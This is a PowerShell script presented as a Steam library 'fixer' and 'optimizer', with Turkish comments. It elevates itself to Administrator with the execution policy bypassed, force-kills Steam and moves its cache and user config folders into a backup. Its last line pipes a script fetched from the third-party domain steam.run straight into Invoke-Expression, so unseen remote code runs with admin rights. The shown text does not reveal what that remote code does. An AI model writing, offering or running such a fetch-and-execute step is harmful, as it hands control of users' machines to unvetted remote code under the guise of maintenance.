# -------------------- 0. CONSOLE PREP (FORCE BLACK THEME) -------------------
# Bu blok, Admin olarak yeniden başlatıldığında o "Mavi" PowerShell ekranını yok eder.
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "Zoream Optimizer | SYS_0xA7"
Clear-Host

# -------------------- 1. ADMIN CHECK (IEX SAFE) --------------------

$identity  = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin   = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Yönetici izni isteniyor ..." -ForegroundColor Yellow
    
    # 1. Script dosya yolunu belirle
    if ($PSCommandPath) {
        $scriptPath = $PSCommandPath
    } else {
        # Eğer memory'den (iex) çalışıyorsa Temp'e kaydet
        $scriptPath = Join-Path $env:TEMP "zoream_fix.ps1"
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8
    }

    # 2. CONHOST.EXE İLE BAŞLAT (Windows Terminal'i bypass eder)
    # Powershell.exe yerine conhost.exe çağırıyoruz, powershell'i içine gömüyoruz.
    
    Start-Process -FilePath "conhost.exe" `
        -Verb RunAs `
        -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""

    exit
}

# -------------------- 2. UI HELPER FUNCTIONS --------------------

function Show-Header {
    Clear-Host
    Write-Host " "
    Write-Host "   ███████╗ ██████╗ ██████╗ ███████╗ █████╗ ███╗   ███╗" -ForegroundColor Cyan
    Write-Host "   ╚══███╔╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗████╗ ████║" -ForegroundColor Cyan
    Write-Host "     ███╔╝ ██║   ██║██████╔╝█████╗  ███████║██╔████╔██║" -ForegroundColor DarkCyan
    Write-Host "    ███╔╝  ██║   ██║██╔══██╗██╔══╝  ██╔══██║██║╚██╔╝██║" -ForegroundColor Blue
    Write-Host "   ███████╗╚██████╔╝██║  ██║███████╗██║  ██║██║ ╚═╝ ██║" -ForegroundColor Blue
    Write-Host "   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝" -ForegroundColor DarkBlue
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "          Steam Library Fixer BY SYS_0xA7 " -ForegroundColor White
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host " "
}

function Write-Log {
    param(
        [string]$Message,
        [string]$Type = "INFO" # INFO, SUCCESS, WARN, ERROR, STEP
    )
    
    $Time = Get-Date -Format "HH:mm:ss"
    
    switch ($Type) {
        "INFO"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [?] $Message" -ForegroundColor Gray }
        "SUCCESS" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [OK] $Message" -ForegroundColor Green }
        "WARN"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [!] $Message" -ForegroundColor Yellow }
        "ERROR"   { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [X] $Message" -ForegroundColor Red }
        "STEP"    { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [>] $Message" -ForegroundColor Cyan }
    }
}

function Ensure-SteamStopped {
    $attempt = 0
    while (Get-Process steam -ErrorAction SilentlyContinue) {
        $attempt++
        Write-Log "Steam is still running (Attempt $attempt)... Force stopping." "WARN"
        Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
        Start-Sleep -Seconds 2

        if ($attempt -ge 5) {
            Write-Log "Failed to stop Steam after multiple attempts." "ERROR"
            exit 1
        }
    }
    Write-Log "Steam processes terminated." "SUCCESS"
}

# -------------------- 3. MAIN LOGIC --------------------

Show-Header

# --- STEP 1: FIND STEAM ---
Write-Log "Locating Steam installation..." "STEP"
try {
    $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -ErrorAction Stop).InstallPath
} catch {
    $steamPath = $null
}

if (-not $steamPath -or -not (Test-Path $steamPath)) {
    Write-Log "Steam path not found in Registry." "ERROR"
    exit 1
}
Write-Log "Steam found at: $steamPath" "SUCCESS"

# --- STEP 2: CLEARBETA TRIGGER ---
Write-Log "Triggering Steam beta cleanup..." "STEP"
Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
Start-Sleep -Seconds 4

# --- STEP 3: KILL PROCESSES ---
Write-Log "Ensuring all Steam processes are stopped..." "STEP"
if (Get-Process steam -ErrorAction SilentlyContinue) {
    Ensure-SteamStopped
} else {
    Write-Log "Steam is already stopped." "SUCCESS"
}

# Double check loop for webhelpers etc
Get-Process -Name "steam*" -ErrorAction SilentlyContinue | Stop-Process -Force

# --- STEP 4: BACKUP & CLEAN ---
$backupPath = Join-Path $steamPath "cache-backup"
Write-Log "Initializing backup directory: $backupPath" "STEP"
New-Item -ItemType Directory -Path $backupPath -Force | Out-Null

# -> APPCACHE
Write-Log "Cleaning AppCache..." "INFO"
$appcachePath = Join-Path $steamPath "appcache"
$appcacheBackupPath = Join-Path $backupPath "appcache"

if (Test-Path $appcachePath) {
    New-Item -ItemType Directory -Path $appcacheBackupPath -Force | Out-Null
    
    # Move everything except stats
    Get-ChildItem $appcachePath -Force -Exclude "stats" | 
        Move-Item -Destination $appcacheBackupPath -Force -ErrorAction SilentlyContinue
    
    # Copy stats (don't move/delete stats to be safe, just backup)
    Copy-Item (Join-Path $appcachePath "stats") $appcacheBackupPath -Recurse -Force -ErrorAction SilentlyContinue
    Write-Log "AppCache cleaned and backed up." "SUCCESS"
} else {
    Write-Log "AppCache not found, skipping." "WARN"
}

# -> DEPOTCACHE
Write-Log "Cleaning DepotCache..." "INFO"
$depotcachePath = Join-Path $steamPath "depotcache"
$depotcacheBackupPath = Join-Path $backupPath "depotcache"

if (Test-Path $depotcachePath) {
    New-Item -ItemType Directory -Path $depotcacheBackupPath -Force | Out-Null
    Get-ChildItem $depotcachePath -Force | Move-Item -Destination $depotcacheBackupPath -Force -ErrorAction SilentlyContinue
    Remove-Item $depotcachePath -Recurse -Force -ErrorAction SilentlyContinue
    Write-Log "DepotCache moved to backup." "SUCCESS"
}

# -> USERDATA (CONFIG & PLAYTIME)
Write-Log "Processing User Data..." "INFO"
$userdataPath = Join-Path $steamPath "userdata"
$userCount = 0

if (Test-Path $userdataPath) {
    foreach ($userFolder in Get-ChildItem $userdataPath -Directory -ErrorAction SilentlyContinue) {
        $userConfigPath = Join-Path $userFolder.FullName "config"
        
        if (Test-Path $userConfigPath) {
            $userCount++
            $userBackupPath = Join-Path $backupPath ("userdata\" + $userFolder.Name)
            New-Item -ItemType Directory -Path $userBackupPath -Force | Out-Null

            # Move config to backup
            Move-Item $userConfigPath (Join-Path $userBackupPath "config") -Force -ErrorAction SilentlyContinue

            # Restore Playtime (localconfig.vdf)
            Write-Log "Restoring playtime for User ID: $($userFolder.Name)" "INFO"
            
            # Re-create config folder
            New-Item -ItemType Directory -Path $userConfigPath -Force | Out-Null
            
            # Copy back localconfig.vdf
            $sourceVDF = Join-Path $userBackupPath "config\localconfig.vdf"
            if (Test-Path $sourceVDF) {
                Copy-Item $sourceVDF (Join-Path $userConfigPath "localconfig.vdf") -Force -ErrorAction SilentlyContinue
            }
        }
    }
}
Write-Log "User cache optimized for $userCount user(s)." "SUCCESS"

# -------------------- 4. FINAL EXECUTION --------------------
Write-Host " "
Write-Log "Optimization Complete. Launching Remote Script..." "STEP"
Write-Host " "
Write-Host "   >>> HANDING OVER TO STEAM.RUN <<<" -ForegroundColor Magenta
Write-Host " "

Start-Sleep -Seconds 1

# Execute the remote script
irm steam.run | iex
